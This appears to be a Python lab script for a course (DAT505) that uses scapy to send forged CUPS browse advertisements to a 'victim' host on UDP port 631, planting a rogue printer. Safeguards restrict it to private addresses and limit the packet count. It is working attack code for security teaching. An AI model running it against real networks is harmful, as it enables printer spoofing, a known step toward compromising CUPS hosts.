
#!/usr/bin/env python3
"""DAT505: Controlled CUPS discovery packet generator.

Use only inside an authorized, isolated laboratory.
"""

import argparse
import ipaddress
import json
import logging
import time
from datetime import datetime, timezone
from pathlib import Path

from scapy.all import IP, UDP, Raw, send, wrpcap


def private_ip(value: str) -> str:
    """Reject addresses outside RFC1918 private networks."""
    address = ipaddress.ip_address(value)
    if address.version != 4 or not address.is_private:
        raise argparse.ArgumentTypeError(
            "Only private IPv4 addresses are allowed."
        )
    return str(address)


def build_packet(args):
    """Construct a legacy CUPS browse advertisement."""
    uri = (
        f"http://{args.printer_ip}:{args.printer_port}"
        f"{args.printer_path}"
    )

    message = (
        f'0 3 {uri} '
        f'"{args.location}" "{args.info}"\n'
    )

    packet = (
        IP(dst=args.victim)
        / UDP(sport=631, dport=631)
        / Raw(load=message.encode("utf-8"))
    )

    return packet, message


def main():
    parser = argparse.ArgumentParser(
        description="DAT505 CUPS discovery lab tool"
    )

    parser.add_argument(
        "--victim", type=private_ip, required=True
    )
    parser.add_argument(
        "--printer-ip", type=private_ip, required=True
    )
    parser.add_argument(
        "--printer-port", type=int, default=8631
    )
    parser.add_argument(
        "--printer-path",
        default="/printers/DAT505-Lab-Printer"
    )
    parser.add_argument(
        "--location", default="DAT505 Lab"
    )
    parser.add_argument(
        "--info", default="Virtual Printer"
    )
    parser.add_argument(
        "--count", type=int, default=1
    )
    parser.add_argument(
        "--interval", type=float, default=1.0
    )
    parser.add_argument(
        "--pcap", default="pcap_files/attack/sent_packets.pcap"
    )
    parser.add_argument(
        "--log", default="evidence/logs/attack.jsonl"
    )

    args = parser.parse_args()

    if not 1 <= args.printer_port <= 65535:
        parser.error("Printer port must be between 1 and 65535.")

    if not 1 <= args.count <= 20:
        parser.error("Count must be between 1 and 20.")

    if not 0.1 <= args.interval <= 60:
        parser.error("Interval must be between 0.1 and 60 seconds.")

    if not args.printer_path.startswith("/"):
        parser.error("Printer path must begin with /.")

    logging.basicConfig(
        level=logging.INFO,
        format="%(levelname)s: %(message)s"
    )

    packet, message = build_packet(args)

    pcap_path = Path(args.pcap)
    log_path = Path(args.log)

    pcap_path.parent.mkdir(parents=True, exist_ok=True)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    logging.info("Target: %s:631", args.victim)
    logging.info("Advertisement: %s", message.strip())

    packets = []

    with log_path.open("a", encoding="utf-8") as logfile:
        for index in range(args.count):
            send(packet, verbose=False)
            packets.append(packet.copy())

            event = {
                "timestamp": datetime.now(
                    timezone.utc
                ).isoformat(),
                "event": "discovery_packet_sent",
                "target": args.victim,
                "printer_ip": args.printer_ip,
                "printer_port": args.printer_port,
                "printer_path": args.printer_path,
                "sequence": index + 1,
                "message": message.strip(),
            }

            logfile.write(json.dumps(event) + "\n")
            logfile.flush()

            logging.info(
                "Sent packet %d/%d",
                index + 1,
                args.count
            )

            if index < args.count - 1:
                time.sleep(args.interval)

    wrpcap(str(pcap_path), packets)

    logging.info("Saved sent packets to %s", pcap_path)
    logging.info("Saved log to %s", log_path)


if __name__ == "__main__":
    main()

